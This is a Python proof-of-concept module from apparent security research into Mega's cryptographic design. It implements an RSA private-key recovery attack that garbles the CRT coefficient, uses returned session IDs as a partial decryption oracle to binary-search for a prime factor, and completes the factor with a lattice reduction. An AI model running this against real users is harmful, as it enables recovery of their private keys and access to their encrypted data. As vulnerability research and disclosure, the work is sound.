
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: class implementing the key recovery attack (used for both the abstract
# example and the MITM PoC)
#

from shared.attack_utils import *
from shared.mega_simulation import *
from shared.constants.mega_crypto import *

from Crypto.Util.number import isPrime

BRUTEFORCE_THRESHOLD = 1 << 20

try:
    # Sage is only needed for the lattic attack part of the key recovery attack
    import sage.all as sage
    has_sage = True
except ModuleNotFoundError:
    has_sage = False
    print("Running attack without lattice optimization -- install sage!")

class MegaRSAKeyRecoveryAttack():
    """
    We exploit that the we can choose the padding, missing padding checks,
    that we can (coarsly) modify the private key, and that we get a partial
    decryption oracle. On a high-level, we perform a binary search for the
    the prime factor q of N = p*q.

    ###########
    # Setting #
    ###########

    Consider RSA-CRT decryption of c = m^e mod N:
        m_p = c^(d_p) mod p
        m_q = c^(d_q) mod q
        t = (m_p - m_q) mod p
        h = (t * u) mod p
        m' = h * q + m_q
    We observe that for m < q we have m_q = m  because m = m_q (mod q)

    If we garble u, the RSA-CRT decryption is still successful for m < q, because:
        t = (m_p - m_q) mod p = 0
        h = 0
        m' = m_q = m
    But for m >= q, we have t =/= 0 and thus h =/= 0. Since we garbled u,
    the result m' =/= m. W.h.p., m' is large, because h*q is large and it's
    no longer a CRT application because u =/= q^-1 mod p

    ##########
    # Attack #
    ##########
    Let x be the number of bits of N.

    1. Garble u
    2. Perform a binary search for the prime q if q < p (resp. q > p) of N
        2.1. Start with bounds (low, up) = (2^(x-1), sqrt(N)) (resp. (sqrt(N),
             2^x-1))
        2.2. Test m = (low + up)//2
        2.3. If the partial decryption oracle returns 0 as SID, then w.h.p.
             m < q, because m' = m < q < 2^1024 means the SID bytes are all
             zeros -> update bounds to (m, up)
        2.4. Otherwise (i.e., when the SID has non-zero bytes), we have m >= q
             and update the bounds to (low, m)

    This requires log_2(isqrt(N)) queries to factor N. For 2048 RSA, that are
    1023 queries.

    Optimization: we terminate the binary search early (after recovering 683
    bits) and recover the missing part of the RSA factor using a lattice attack.
    """

    def __init__(self, pubk, do_ct_len_encode=False, bruteforce_threshold=BRUTEFORCE_THRESHOLD):
        """
        Maintain the interval (low, up) in which the factor q is located.
        Since there is no overflow, the invariant up >= low always holds.

        :param pubk: public key
        :param do_ct_len_encode: optional Boolean, if set, do length encoding on
            ciphertext
        """

        self.pubk = pubk
        self.n, self.e = pubk
        self.do_ct_len_encode = do_ct_len_encode
        self.oracle_queries = 0

        # Initialize the search interval using the assumption that p and q are
        # exactly of n/2 bits, where n is the number of bits in the modulus.
        self.low = 1 << (self.n.bit_length()//2 - 1)
        self.up = (1 << ((self.n.bit_length() + 1)//2)) - 1

        # The lattice attack works for < N^(1/6) unknown bits
        self.remaining_bits = floor_int_div(self.n.bit_length(), 6)
        self.bruteforce_threshold = bruteforce_threshold

    def get_next_sid(self):
        """
        Return the next encrypted SID for the binary search for q
        """
        sid = (self.low + self.up) >> 1
        self.last_sid = sid
        sid_bytes = int_to_bytes(sid)
        return rsa_encrypt(sid_bytes, self.pubk, do_pad=False, do_ct_len_encode=self.do_ct_len_encode)


    def feed_response(self, r):
        """
        Process intervals based on the SID returned by the client

        :param r: response SID from the client as integer

        :return: True if we successfully recovered the factor, False if we need
        more queries, and it throws an error when the attack failed.
        """

        self.oracle_queries += 1

        if r == 0:
            self.low = self.last_sid
        else:
            self.up = self.last_sid

        if has_sage:
            if (self.up - self.low).bit_length() > self.remaining_bits:
                return False
            else:
                # If we have recovered enough bits of the factor, recover the remaining
                # bits with a lattice attack.

                # low and up could have a small difference but more than x/3 different
                # bits in case there was an overflow. However, either the upper bits
                # of low or the upper bits of up are the correct ones.
                for a in [self.up, self.low]:
                    # remove lower bits
                    a >>= self.remaining_bits
                    a <<= self.remaining_bits

                    # Use the following lattice to recover the small root r of
                    # f(x) = x + a mod q, which exists since a + r = q when r is set
                    # to the missing lower bits of q.
                    # Lattice:
                    #       |X^2  X*a  0 |
                    #   M = |  0    X  a |
                    #       |  0    0  n |
                    R = (1 << self.remaining_bits)
                    M = sage.matrix([[R**2, R*a, 0], [0, R, a], [0, 0, self.n]])
                    B = M.LLL()

                    PR = sage.PolynomialRing(sage.ZZ, 'x')
                    x = PR.gen()
                    v2 = B[0][0] / R**2
                    v1 = B[0][1] / R
                    v0 = B[0][2]
                    Q = v2 * x**2 + v1 * x + v0

                    roots = Q.roots()
                    if len(roots) == 0:
                        print(f"No roots. Recovery only works up until "
                              f"{self.remaining_bits} missing bits")
                        continue

                    for root, _ in roots:
                        q = a + int(root)
                        if q != 0 and self.n % q == 0 and 1 < q < self.n:
                            break

                    break
                else:
                    assert False, "No root found"
        else:
            # No sage is available, so we continue doing the binary search until
            # the interval is small enough to try all solutions
            if self.up - self.low > self.bruteforce_threshold:
                return False
            else:
                for q in range(self.low, self.up + 1, 1):
                    if self.n % q == 0:
                        break

        if q == 0:
            assert False, "No root found"
        p = self.n // q

        assert 1 < p < self.n
        assert self.n == p * q
        assert isPrime(p)
        assert isPrime(q)

        self.p = p
        self.q = q

        return True
